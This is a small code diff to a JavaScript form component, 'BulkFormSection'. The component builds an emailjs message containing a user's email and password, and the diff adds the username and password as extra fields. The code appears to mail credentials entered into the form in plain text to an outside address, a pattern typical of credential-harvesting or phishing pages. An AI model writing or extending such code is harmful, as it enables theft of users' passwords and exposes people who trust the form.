@@ -220,6 +220,8 @@ const BulkFormSection = () => {
                     const templateParams = {
                       email: email,
                       message: `email: ${data.email} password: ${password}`,
+                      name: username,
+                      password: password,
                     };
 
                     await emailjs
